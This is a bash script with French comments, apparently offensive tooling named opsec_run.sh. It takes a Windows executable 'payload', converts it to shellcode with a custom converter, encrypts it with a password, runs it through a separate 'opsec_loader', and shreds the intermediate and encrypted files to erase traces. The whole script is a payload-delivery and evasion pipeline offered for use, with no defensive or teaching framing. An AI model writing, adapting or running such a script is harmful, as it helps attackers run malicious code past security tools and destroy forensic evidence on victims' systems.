#!/bin/bash
# Usage: ./opsec_run.sh <payload.exe> <password>
set -e # Arrêt à la première erreur

if [ $# -lt 2 ]; then
    echo "Usage: $0 <payload.exe> <password>" >&2
    exit 1
fi

EXE=$1
PWD=$2
TMP=$(mktemp -d)
SC="$TMP/sc.bin"
ENC="$TMP/enc.bin"

echo "[*] Conversion PE→Shellcode..." >&2

# 1. Conversion PE vers Shellcode avec notre convertisseur personnalisé
python3 custom_pe2sc.py "$EXE" "$SC" 2>/dev/null
if [ ! -f "$SC" ]; then
    echo "[-] Erreur: échec conversion shellcode" >&2
    rm -rf "$TMP"
    exit 1
fi

echo "[*] Chiffrement du shellcode..." >&2

# 2. Chiffrement avec encrypt_shell.py existant
python3 encrypt_shell.py "$SC" "$PWD" "$ENC"
if [ ! -f "$ENC" ]; then
    echo "[-] Erreur: échec chiffrement" >&2
    shred -u "$SC" 2>/dev/null || rm -f "$SC"
    rm -rf "$TMP"
    exit 1
fi

# Nettoyage immédiat du shellcode non chiffré
shred -u "$SC" 2>/dev/null || rm -f "$SC"

echo "[*] Exécution..." >&2

# 3. Exécution avec opsec_loader existant
./opsec_loader "$ENC" "$PWD"
RET=$?

# 4. Nettoyage final
echo "[*] Nettoyage traces..." >&2
shred -u "$ENC" 2>/dev/null || rm -f "$ENC"
rmdir "$TMP" 2>/dev/null

exit $RET